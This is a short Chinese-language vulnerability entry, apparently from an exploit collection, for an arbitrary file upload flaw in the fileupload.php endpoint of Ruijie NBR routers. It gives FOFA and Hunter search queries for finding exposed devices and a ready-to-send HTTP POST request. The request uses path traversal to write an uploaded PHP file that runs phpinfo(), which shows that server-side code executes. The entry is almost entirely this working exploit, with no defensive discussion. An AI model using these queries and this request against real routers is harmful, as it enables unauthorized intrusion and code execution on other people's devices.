# 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞

## 网络测绘

fofa: app="Ruijie-NBR路由器"

hunter: app.name="Ruijie 锐捷 NBR"

## POC / EXP

```
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```